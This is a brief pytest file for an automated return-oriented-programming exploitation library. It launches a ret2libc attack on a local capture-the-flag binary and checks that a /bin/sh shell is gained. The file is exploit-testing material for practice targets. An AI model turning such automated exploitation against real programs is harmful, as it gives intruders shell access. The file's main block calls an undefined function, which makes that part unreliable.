from autorop import *
from flaky import flaky


@flaky(max_runs=3)
def test_ret2libc_local():
    BIN = "./tests/bamboofox/ret2libc"
    s = PwnState(BIN, process(BIN))
    turnkey.classic(s)
    s.target.clean(1)
    s.target.sendline("echo $0")
    assert s.target.readline() == b"/bin/sh\n"


if __name__ == "__main__":
    test_return_to_what()
